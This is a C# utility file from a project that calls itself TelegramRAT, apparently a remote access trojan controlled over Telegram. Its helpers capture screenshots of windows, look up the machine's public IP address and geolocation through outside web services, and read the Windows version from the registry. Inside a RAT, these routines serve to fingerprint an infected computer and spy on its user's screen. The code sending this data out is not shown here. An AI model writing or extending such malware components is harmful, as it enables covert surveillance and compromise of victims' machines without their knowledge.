using Microsoft.Win32;
using System.Drawing;
using System.Net.Http;
using System.Xml.Serialization;
using TelegramRAT.Features;
using System.IO;

namespace TelegramRAT.Utilities;

static class Utils
{
    public static void CaptureWindow(IntPtr hWnd, Stream buffer)
    {
        WinAPI.GetClientRect(hWnd, out Rectangle windowbounds);

        using Bitmap windowCap = new Bitmap(windowbounds.Width, windowbounds.Height);
        using Graphics wndGraphics = Graphics.FromImage(windowCap);

        IntPtr graphicsDc = wndGraphics.GetHdc();
        IntPtr windowDc = WinAPI.GetDC(hWnd);

        WinAPI.BitBlt(graphicsDc, 0, 0, windowbounds.Width, windowbounds.Height, windowDc, 0, 0, 13369376);

        wndGraphics.ReleaseHdc();

        windowCap.Save(buffer, System.Drawing.Imaging.ImageFormat.Png);
    }

    public static async Task<string> GetIpAddressAsync()
    {
        using HttpClient client = new HttpClient();
        string ip = await client.GetStringAsync("https://api.ipify.org");
        return ip.Trim();
    }

    public static async Task<NetworkInfo?> GetNetworkInfoAsync()
    {
        using HttpClient client = new HttpClient();
        string xml = await client.GetStringAsync("https://ip-api.com/xml");
        XmlSerializer serializer = new(typeof(NetworkInfo));
        using StringReader reader = new(xml);
        return serializer.Deserialize(reader) as NetworkInfo;
    }

    public static string GetWindowsVersion()
    {
        try
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            if (key != null)
            {
                string prodName = key.GetValue("ProductName") as string;
                string csdVer = key.GetValue("CSDVersion") as string;
                return prodName + csdVer;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
        return string.Empty;
    }
}
